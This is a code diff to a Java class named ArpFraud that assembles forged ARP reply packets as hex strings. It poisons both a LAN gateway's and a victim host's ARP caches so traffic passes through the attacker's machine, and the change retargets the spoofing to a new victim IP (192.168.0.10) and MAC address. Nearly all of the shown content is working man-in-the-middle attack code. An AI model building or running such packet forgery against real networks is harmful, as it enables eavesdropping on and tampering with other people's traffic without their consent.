@@ -19,7 +19,7 @@ public class ArpFraud {
         String destinationMac = "c4 36 55 92 c0 05";
         String destinationIp = "c0 a8 00 01";
         String sourceMac = "40 e2 30 df f9 ff";
-        String sourceIp = "c0 a8 00 06";
+        String sourceIp = "c0 a8 00 0a";
 
         String responseToGateway = destinationMac + sourceMac
                 + ConstantUtils.Ethernet.ETHER_TYPE_ARP.getValue()
@@ -30,8 +30,8 @@ public class ArpFraud {
                 + ConstantUtils.Arp.OPCODE_RESPONSE.getValue()
                 + sourceMac + sourceIp + destinationMac + destinationIp;
 
-        destinationMac = "f4 f5 db 2f 98 7b";
-        destinationIp = "c0 a8 00 06";
+        destinationMac = "60 d8 19 2c f2 62";
+        destinationIp = "c0 a8 00 0a";
 //        sourceMac = "";
         sourceIp = "c0 a8 00 01";
 
@@ -59,8 +59,8 @@ public class ArpFraud {
 
         destinationMac = "40 e2 30 df f9 ff";
         destinationIp = "c0 a8 00 07";
-        sourceMac = "f4 f5 db 2f 98 7b";
-        sourceIp = "c0 a8 00 06";
+        sourceMac = "60 d8 19 2c f2 62";
+        sourceIp = "c0 a8 00 0a";
         String responseToMe2 = destinationMac + sourceMac
                 + ConstantUtils.Ethernet.ETHER_TYPE_ARP.getValue()
                 + ConstantUtils.Arp.HARDWARE_TYPE_ETHER.getValue()
